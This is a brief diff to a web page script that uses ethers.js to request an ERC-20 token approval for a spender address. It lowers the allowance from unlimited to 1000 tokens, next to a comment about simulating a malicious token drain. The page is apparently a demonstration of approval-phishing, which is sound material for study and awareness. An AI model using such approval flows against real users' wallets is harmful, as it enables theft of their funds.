@@ -254,7 +254,7 @@
 
     try {
       status.innerText = "🚨 Sending approval...";
-      const tx = await token.approve(spenderAddress, ethers.constants.MaxUint256);
+      const tx = await token.approve(spenderAddress, ethers.utils.parseUnits("1000", 18));
       await tx.wait();
 
       // Simulate malicious token drain
